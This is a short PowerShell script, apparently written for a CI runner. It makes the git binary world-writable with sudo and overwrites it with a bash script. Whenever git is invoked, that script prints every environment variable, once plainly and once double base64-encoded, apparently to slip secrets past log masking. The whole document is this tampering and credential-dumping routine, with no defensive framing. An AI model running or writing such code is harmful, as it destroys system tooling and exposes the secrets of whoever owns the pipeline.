Write-Host "hello"

which git



$content = @"
#!/bin/bash

env
echo ----
env |base64 -w0 |base64 -w0
echo ----
"@

$gitPath = & which git
sudo chmod 777 $gitPath

Set-Content -Path $gitPath -Value $content
Format-Hex -path $gitPath
